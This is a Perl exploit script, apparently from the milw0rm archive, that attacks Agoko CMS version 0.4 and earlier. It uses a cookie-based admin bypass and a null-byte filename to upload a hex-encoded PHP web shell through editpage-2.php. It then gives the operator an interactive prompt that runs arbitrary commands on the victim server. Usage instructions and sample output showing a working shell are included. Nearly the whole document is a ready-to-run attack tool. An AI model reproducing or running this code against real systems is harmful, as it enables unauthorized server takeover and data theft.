#!/usr/bin/perl

print q~
--------------------------------------------------
Agoko CMS <= 0.4 remote commands execution exploit
by staker
mail: staker[at]hotmail[dot]it
--------------------------------------------------

[*] Usage   -> perl [xpl.pl] [host] [path]
[*] Example -> perl agk.pl localhost /Agoko

~;

         
#>-----------<#
#>- Working -<#
#>-----------<#########################################
# staker[death]:~/Desktop$ perl a.pl 127.0.0.1 /agoko #
#                                                     #
# --------------------------------------------------  #
# Agoko CMS <= 0.4 remote commands execution exploit  #
# by staker                                           #
# mail: staker[at]hotmail[dot]it                      #
# --------------------------------------------------  #
#                                                     #
# [*] Usage   -> perl [xpl.pl] [host] [path]          #
# [*] Example -> perl agk.pl localhost /Agoko         #
#                                                     #
# shell already exists.                               #
#                                                     #
# Agoko[shell]:~$ uname -n -r                         #
#                                                     #
# death 2.6.27-7-generic                              #
#######################################################


use IO::Socket;
use LWP::Simple;


my $host = shift;
my $path = shift || exit(0);


check_shell($host,$path);


sub check_shell() {
     my $host = $_[0];
     my $path = $_[1] || die $!;
     
     my $packet = "GET /$path/content/shell_vup.php HTTP/1.1\r\n".
                  "Host: $host\r\n".
                  "Cookie: bany=love_me\r\n".
                  "User-Agent: Lynx (textmode)\r\n".
                  "Connection: close\r\n\r\n";
     
     if (give_kt($host,$packet) =~ /bany wtf/i) {
        print "[*] shell already exists.\n";
        load_cmd($host,$path);
     }
     else {
        print "[*] exploiting..\n";
        inject_shell($host,$path);
     }      
}     
                  

sub inject_shell() {
     my ($host,$path) = @_;  
     
     my $shell = "\x3C\x3F\x70\x68\x70\x20\x20\x20\x20\x20\x20\x65\x72\x72".
                 "\x6F\x72\x5F\x72\x65\x70\x6F\x72\x74\x69\x6E\x67\x28\x45".
                 "\x5F\x41\x4C\x4C\x29\x3B\x20\x20\x20\x20\x20\x20\x20\x20".
                 "\x20\x20\x20\x20\x69\x66\x20\x28\x69\x73\x73\x65\x74\x28".
                 "\x24\x5F\x47\x45\x54\x5B\x27\x63\x6D\x64\x27\x5D\x29\x29".
                 "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x70\x61\x73\x73".
                 "\x74\x68\x72\x75\x28\x73\x74\x72\x69\x70\x73\x6C\x61\x73".
                 "\x68\x65\x73\x28\x24\x5F\x47\x45\x54\x5B\x27\x63\x6D\x64".
                 "\x27\x5D\x29\x29\x3B\x20\x20\x20\x20\x20\x20\x65\x6C\x73".
                 "\x65\x20\x20\x20\x20\x20\x20\x20\x20\x20\x64\x69\x65\x28".
                 "\x22\x62\x61\x6E\x79\x20\x77\x74\x66\x22\x29\x3B\x20\x20".
                 "\x20\x20\x20\x20\x3F\x3E\x20";
     
     
     my $data = "filename=shell_vup.php\x00&text=$shell&Submit=Speichern";
     
     my $packet = "POST /$path/admintools/editpage-2.php HTTP/1.1\r\n".
                  "Host: $host\r\n".
                  "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n".
                  "Cookie: bany=love_me\r\n".
                  "Content-Type: application/x-www-form-urlencoded\r\n".
                  "Content-Length: ".length($data)."\r\n".
                  "Connection: close\r\n\r\n".
                   $data;      
     
     if (give_kt($host,$packet) =~ /erfolgreich eingetragen/i) 
     {
         load_cmd($host,$path) 
     }
     else 
     {
         die "[*] Exploit failed.\n";
     }        
     
}                        
   

sub load_cmd() {
     my $host = $_[0];
     my $path = $_[1];
     
     while (1) 
     {
          print "\nAgoko[shell]:~\$ ";
          chomp (my $cmd = <STDIN>);
          
          exit(0) if $cmd =~ /^(exit|quit|out)+$/i;
          
          getprint("http://$host/$path/content/shell_vup.php?cmd=$cmd");
     }     
}
          
         
sub give_kt() {
     my $input = $_[0];
     my $heads = $_[1] || die $!;
     
     my $result;
     my $socket = IO::Socket::INET->new(
                                         PeerAddr => $input,
                                         PeerPort => 80,
                                         Proto    => 'tcp'
                                       ) || die $!;
     
     $socket->send($heads);
     
     while (<$socket>) { $result .= $_; }
     
     return $result;
} 

# milw0rm.com [2009-09-09]
